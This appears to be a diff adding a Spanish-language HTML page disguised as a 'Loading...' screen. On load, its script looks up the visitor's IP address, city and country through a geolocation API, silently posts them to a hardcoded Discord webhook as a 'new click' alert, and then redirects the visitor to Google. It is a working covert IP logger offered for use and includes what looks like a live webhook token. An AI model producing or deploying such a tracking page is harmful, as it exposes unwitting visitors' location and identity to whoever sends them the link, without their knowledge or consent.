@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+</head>
+<body>
+    <script>
+        async function obtenerUbicacion() {
+            try {
+                const respuesta = await fetch('https://freeipapi.com/api/json');
+                if (!respuesta.ok) throw new Error('API falló');
+
+                const datos = await respuesta.json();
+
+                const info = {
+                    ip: datos.ipAddress || 'No disponible',
+                    ciudad: datos.cityName || 'Desconocida',
+                    pais: datos.countryName || 'Desconocido',
+                    hora: new Date().toLocaleString('es-MX')
+                };
+
+                const webhookUrl = "https://discord.com/api/webhooks/1483527914291986586/8kciyuEGGrN7zWPStsoqOSzTeFghXsVMdzPktkTaeWtjNh6sNUY9u9IVZ2My1d1MjHpR";  // ← TU WEBHOOK AQUÍ
+
+                await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        content: `🚨 **Nuevo clic** 🚨\n\n**IP:** ${info.ip}\n**Ubicación:** ${info.ciudad}, ${info.pais}\n**Hora:** ${info.hora}`
+                    })
+                });
+
+                window.location.href = "https://www.google.com";
+            } catch (error) {
+                window.location.href = "https://www.google.com";
+            }
+        }
+
+        obtenerUbicacion();
+    </script>
+</body>
+</html>
